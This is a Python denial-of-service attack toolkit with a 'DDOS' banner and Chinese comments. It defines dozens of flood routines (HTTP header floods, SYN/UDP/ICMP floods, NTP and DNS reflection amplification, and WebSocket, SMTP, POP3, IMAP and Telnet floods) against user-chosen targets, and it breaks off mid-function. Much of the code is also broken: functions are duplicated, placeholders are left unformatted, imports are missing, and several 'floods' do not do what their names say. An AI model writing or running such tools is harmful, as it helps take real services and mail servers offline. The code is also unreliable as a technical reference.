import socket
import threading
import time
import random
import requests
from scapy.all import *



logo = '''
    ╦╦╦╦╦╦   ╬      ╬    ╗          ╔
    ╠               ╬  ╬        ╗      ╔
    ╠                 ╬            ╗  ╔
    ╠╩╩╩╩         ╬              ╬
    ╠                 ╬            ╔  ╗
    ╠                 ╬          ╔      ╗
    ╠                 ╬        ╔          ╗



    DDDD       DDDD        OOOOO      SSSSS
    D   D      D   D      O     O    S     S
    D    D     D    D    O       O   S
    D     D    D     D   O       O    SSSS
    D    D     D    D    O       O        S
    D   D      D   D      O     O         S
    DDDD       DDDD        OOOOO     SSSSS
    
    '''
print(logo)



from_email = input("伪造的发件人邮件地址(SMTP)：")
to_email = input("伪造的收件人邮件地址(STMP)：")
username = input("伪造的用户名(POP3/IMAP)：")
password = input("伪造的密码(POP3/IMAP)：")

# 定义所有攻击方法的函数
def http_te_proxy_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nTE-Proxy: " + b"deflate" * 100 + b"\r\n\r\n")
    print(f"HTTP TE-Proxy泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_max_forwards_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nMax-Forwards: " + b"10" * 100 + b"\r\n\r\n")
    print(f"HTTP Max-Forwards泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_if_range_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nIf-Range: " + b"\"etag\"" * 100 + b"\r\n\r\n")
    print(f"HTTP If-Range泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_if_none_match_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nIf-None-Match: " + b"\"etag\"" * 100 + b"\r\n\r\n")
    print(f"HTTP If-None-Match泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_if_modified_since_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nIf-Modified-Since: " + b"Wed, 21 Oct 2015 07:28:00 GMT" * 100 + b"\r\n\r\n")
    print(f"HTTP If-Modified-Since泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_range_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nRange: " + b"bytes=0-1024" * 100 + b"\r\n\r\n")
    print(f"HTTP Range泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_connection_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nConnection: " + b"keep-alive" * 100 + b"\r\n\r\n")
    print(f"HTTP Connection泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_accept_encoding_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nAccept-Encoding: " + b"gzip, deflate" * 100 + b"\r\n\r\n")
    print(f"HTTP Accept-Encoding泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_accept_language_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: {target_website}\r\nAccept-Language: " + b"en-US,en;q=0.5" * 100 + b"\r\n\r\n")
    print(f"HTTP Accept-Language泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_accept_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nAccept: " + b"text/html" * 100 + b"\r\n\r\n")
    print(f"HTTP Accept泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_user_agent_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nUser-Agent: " + b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" * 100 + b"\r\n\r\n")
    print(f"HTTP User-Agent泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_referer_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nReferer: " + b"http:// {target_website}/" * 100 + b"\r\n\r\n")
    print(f"HTTP Referer泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_from_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nFrom: " + b"user@ {target_website}" * 100 + b"\r\n\r\n")
    print(f"HTTP From泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_expect_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"POST / HTTP/1.1\r\nHost:  {target_website}\r\nExpect: " + b"100-continue" * 100 + b"\r\n\r\n")
    print(f"HTTP Expect泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_pragma_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nPragma: " + b"no-cache" * 100 + b"\r\n\r\n")
    print(f"HTTP Pragma泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_cache_control_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nCache-Control: " + b"no-cache" * 100 + b"\r\n\r\n")
    print(f"HTTP Cache-Control泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_upgrade_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nUpgrade: " + b"websocket" * 100 + b"\r\n\r\n")
    print(f"HTTP Upgrade泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_te_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nTE: " + b"trailers, deflate" * 100 + b"\r\n\r\n")
    print(f"HTTP TE泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_max_forwards_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nMax-Forwards: " + b"10" * 100 + b"\r\n\r\n")
    print(f"HTTP Max-Forwards泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_if_range_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nIf-Range: " + b"\"etag\"" * 100 + b"\r\n\r\n")
    print(f"HTTP If-Range泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_if_none_match_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nIf-None-Match: " + b"\"etag\"" * 100 + b"\r\n\r\n")
    print(f"HTTP If-None-Match泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_if_modified_since_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nIf-Modified-Since: " + b"Wed, 21 Oct 2015 07:28:00 GMT" * 100 + b"\r\n\r\n")
    print(f"HTTP If-Modified-Since泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_range_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nRange: " + b"bytes=0-1024" * 100 + b"\r\n\r\n")
    print(f"HTTP Range泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_transfer_encoding_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nTransfer-Encoding: " + b"chunked" * 100 + b"\r\n\r\n")
    print(f"HTTP Transfer-Encoding泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_connection_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nConnection: " + b"keep-alive" * 100 + b"\r\n\r\n")
    print(f"HTTP Connection泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_accept_encoding_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nAccept-Encoding: " + b"gzip, deflate, br" * 100 + b"\r\n\r\n")
    print(f"HTTP Accept-Encoding泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_accept_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nAccept: " + b"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" * 100 + b"\r\n\r\n")
    print(f"HTTP Accept泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_host_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost: " + b" {target_website}" * 100 + b"\r\n\r\n")
    print(f"HTTP Host泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_user_agent_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nUser-Agent: " + b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" * 100 + b"\r\n\r\n")
    print(f"HTTP User-Agent泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_referer_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nReferer: " + b"http:// {target_website}/" * 100 + b"\r\n\r\n")
    print(f"HTTP Referer泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_cookie_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\nCookie: " + b"SESSIONID=12345;" * 100 + b"\r\n\r\n")
    print(f"HTTP Cookie泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def http_body_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"POST / HTTP/1.1\r\nHost:  {target_website}\r\nContent-Length: 1000\r\n\r\n" + b"A" * 1000)
    print(f"HTTP请求体泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_header_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"GET / HTTP/1.1\r\nHost:  {target_website}\r\n\r\n")
    print(f"HTTP请求头泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def syn_ack_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"SYN-ACK Flood\r\n")
    print(f"TCP连接全开攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def syn_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"SYN Flood\r\n")
    print(f"TCP连接半开攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def tcp_reset_attack(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"TCP Reset Attack\r\n")
    print(f"TCP连接重置攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def tcp_connection_exhaustion(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"TCP Connection Exhaustion\r\n")
    print(f"TCP连接耗尽攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def icmp_mask_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"ICMP Mask Flood\r\n")
    print(f"ICMP地址掩码请求泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def icmp_timestamp_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"ICMP Timestamp Flood\r\n")
    print(f"ICMP时间戳请求泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def icmp_redirect_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"ICMP Redirect Flood\r\n")
    print(f"ICMP重定向泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def icmp_echo_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"ICMP Echo Flood\r\n")
    print(f"ICMP回显请求泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def dns_query_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"DNS Query Flood\r\n")
    print(f"DNS查询泛洪已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def chargen_reflection(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"Chargen Reflection\r\n")
    print(f"Chargen反射攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def rip_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"RIP Amplification\r\n")
    print(f"RIP放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def ldap_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"LDAP Amplification\r\n")
    print(f"LDAP放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def cldap_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"CLDAP Amplification\r\n")
    print(f"CLDAP放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def memcached_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"Memcached Amplification\r\n")
    print(f"Memcached放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def snmp_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"SNMP Amplification\r\n")
    print(f"SNMP放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def ssdp_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"SSDP Amplification\r\n")
    print(f"SSDP放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def chargen_amplification(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"Chargen Amplification\r\n")
    print(f"Chargen放大攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def ntp_amplification(target_ip, _, count):
    servers = load_reflection_servers("ntp_servers.txt")
    payload = b'\x17\x00\x03\x2a' + b'\x00' * 40
    for _ in range(count//THREAD_COUNT):
        for server in servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (server, 123))
            sock.close()

def dns_amplification(target_ip, _, count):
    servers = load_reflection_servers("dns_servers.txt")
    payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    for _ in range(count//THREAD_COUNT):
        for server in servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (server, 53))
            sock.close()

def http_post_flood(target_url, data, count):
    for _ in range(count):
        response = requests.post(target_url, data=data)
        print(f"HTTP POST请求已发送，状态码: {response.status_code}")
    print(f"HTTP POST泛洪攻击已对 {target_url} 完成 {count} 次请求")


def http_get_flood(target_url, count):
    for _ in range(count):
        response = requests.get(target_url)
        print(f"HTTP GET请求已发送，状态码: {response.status_code}")
    print(f"HTTP GET泛洪攻击已对 {target_url} 完成 {count} 次请求")


def udp_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"UDP Flood\r\n")
    print(f"UDP泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def syn_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        client.send(b"SYN\r\n")
    print(f"SYN泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def http_dnt_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        # 构造包含DNT标头的HTTP请求
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {target_ip}\r\n"
            f"DNT: 1\r\n"  # DNT标头，表示请求者希望不被追踪
            f"User-Agent: {random.choice(['Mozilla/5.0', 'Chrome/91.0', 'Safari/537.36'])}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        client.send(request.encode())
        time.sleep(0.01)  # 控制请求发送速度，避免过快导致连接被拒绝

    print(f"HTTP DNT泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def bandwidth_consumption_attack(target_ip, target_port, count, packet_size):
    """
    带宽消耗攻击函数，向目标服务器发送大量数据包。
    
    target_ip: 目标服务器IP
    target_port: 目标服务器端口
    count: 发送数据包的数量
    packet_size: 每个数据包的大小（字节）
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 连接到目标
    client.connect((target_ip, target_port))
    
    # 构造一个数据包（根据packet_size指定大小）
    data = random._urandom(packet_size)  # 生成随机字节数据
    
    # 发送大量数据包以消耗带宽
    for _ in range(count):
        client.send(data)  # 发送数据包
        time.sleep(0.1)  # 控制发送间隔，避免过快导致连接被拒绝
    
    print(f"带宽消耗攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次发送数据包，每个数据包大小为 {packet_size} 字节")

def http_dos_attack(target_ip, target_port, count, request_size):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 连接到目标服务器
    client.connect((target_ip, target_port))
    
    # 构造一个简单的 HTTP 请求，模拟攻击流量
    request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    request = request.encode('utf-8')  # 转换为字节流
    
    # 控制请求大小
    request = request.ljust(request_size, b' ')  # 确保请求达到指定大小
    
    # 发送大量的 HTTP 请求
    for _ in range(count):
        client.send(request)  # 发送请求
        time.sleep(0.1)  # 可以控制发送的间隔，避免过于频繁
        print(f"已发送 {(_+1)} 次 HTTP 请求到 {target_ip}:{target_port}")
    
    print(f"HTTP DoS 攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")

def websocket_flood(target_ip, target_port, count):

    def attack():
        try:
            # 连接目标服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))

            # 构造 WebSocket 握手请求
            handshake = (
                "GET / HTTP/1.1\r\n"
                "Host: {target_ip}\r\n"
                "Upgrade: websocket\r\n"
                "Connection: Upgrade\r\n"
                "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                "Sec-WebSocket-Version: 13\r\n\r\n"
            ).format(target_ip=target_ip).encode('utf-8')

            # 发送 WebSocket 握手请求
            client.send(handshake)
            print(f"已建立第 {_+1} 次 WebSocket 连接到 {target_ip}:{target_port}")

            # 模拟维持连接一段时间，消耗服务器资源
            time.sleep(30)  # 可以根据需求修改维持时间
            
            client.close()
            print(f"第 {_+1} 次 WebSocket 连接已关闭")

        except Exception as e:
            print(f"连接失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()
    
    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"WebSocket Flood 攻击已完成，发送了 {count} 次连接请求到 {target_ip}:{target_port}")


def smtp_flood(target_ip, target_port, from_email, to_email, count):
    """
    SMTP Flood 攻击函数，通过发送大量的邮件请求来消耗目标邮件服务器的资源。
    
    target_ip: 目标邮件服务器的 IP 地址
    target_port: 目标邮件服务器的端口号（SMTP 通常使用 25, 465, 587）
    from_email: 伪造的发件人邮件地址
    to_email: 伪造的收件人邮件地址
    count: 发送的邮件数量
    """
    def attack():
        try:
            # 建立到目标邮件服务器的连接
            server = smtplib.SMTP(target_ip, target_port, timeout=10)
            
            # 如果服务器需要身份验证，可以使用以下代码进行登录（可选）
            # server.login("username", "password")
            
            # 构造邮件内容
            subject = ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # 随机主题
            body = "A"*1000  # 随机邮件内容
            
            message = f"From: {from_email}\r\nTo: {to_email}\r\nSubject: {subject}\r\n\r\n{body}"

            # 发送邮件
            server.sendmail(from_email, to_email, message)
            print(f"已发送第 {_+1} 封邮件")

            server.quit()

        except Exception as e:
            print(f"发送邮件失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()
    
    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"SMTP Flood 攻击已完成，发送了 {count} 封邮件到 {target_ip}:{target_port}")



def pop3_flood(target_ip, target_port, username, password, count):
    """
    POP3 Flood 攻击函数，通过发送大量的 POP3 认证请求来消耗目标邮件服务器的资源。
    
    target_ip: 目标 POP3 服务器的 IP 地址
    target_port: 目标 POP3 服务器的端口号（POP3 通常使用 110 端口）
    username: 伪造的用户名
    password: 伪造的密码
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 POP3 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))
            
            # 接收欢迎信息，POP3 服务器会发送一个欢迎消息
            welcome_msg = client.recv(1024)
            print(f"收到欢迎信息: {welcome_msg.decode()}")
            
            # 发送用户名
            client.send(f"user {username}\r\n".encode())
            client.recv(1024)  # 接收回应

            # 发送密码
            client.send(f"pass {password}\r\n".encode())
            client.recv(1024)  # 接收回应

            # 模拟读取邮件或其他 POP3 命令（这里发送的是无意义的命令）
            client.send(b"stat\r\n")
            client.recv(1024)  # 接收回应
            
            # 断开连接
            client.close()
            
            print(f"第 {_+1} 次请求已发送")
        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"POP3 Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")



def imap_flood(target_ip, target_port, username, password, count):
    """
    IMAP Flood 攻击函数，通过发送大量的 IMAP 认证请求来消耗目标邮件服务器的资源。
    
    target_ip: 目标 IMAP 服务器的 IP 地址
    target_port: 目标 IMAP 服务器的端口号（IMAP 通常使用 143 或 993 端口）
    username: 伪造的用户名
    password: 伪造的密码
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 IMAP 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))
            
            # 接收服务器的欢迎消息，IMAP 服务器通常会发送欢迎信息
            welcome_msg = client.recv(1024)
            print(f"收到欢迎信息: {welcome_msg.decode()}")
            
            # 发送 IMAP 协议的登录命令（通过伪造的用户名和密码）
            login_cmd = f"A001 LOGIN {username} {password}\r\n"
            client.send(login_cmd.encode())
            client.recv(1024)  # 接收回应
            
            # 发送无意义的命令来保持连接，例如 IDLE 命令（模拟用户的空闲操作）
            client.send(b"A002 IDLE\r\n")
            client.recv(1024)  # 接收回应

            # 断开连接
            client.close()
            
            print(f"第 {_+1} 次请求已发送")
        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"IMAP Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")


def telnet_flood(target_ip, target_port, count):
    """
    Telnet Flood 攻击函数，通过向目标 Telnet 服务器发送大量的连接请求，消耗服务器资源。
    
    target_ip: 目标 Telnet 服务器的 IP 地址
    target_port: 目标 Telnet 服务器的端口号（默认 Telnet 使用 23 端口）
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 Telnet 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))

            # 接收 Telnet 服务器的欢迎信息
            welcome_msg = client.recv(1024)
            print(f"收到欢迎信息: {welcome_msg.decode()}")
            
            # 发送一个简单的 Telnet 命令，保持连接活动
            client.send(b"Hello\r\n")
            client.recv(1024)  # 接收回应

            # 断开连接
            client.close()
            
            print(f"第 {_+1} 次请求已发送")
        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"Telnet Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")


def ftp_flood(target_ip, target_port, count):
    """
    FTP Flood 攻击函数，通过向目标 FTP 服务器发送大量的连接请求，消耗服务器资源。

    target_ip: 目标 FTP 服务器的 IP 地址
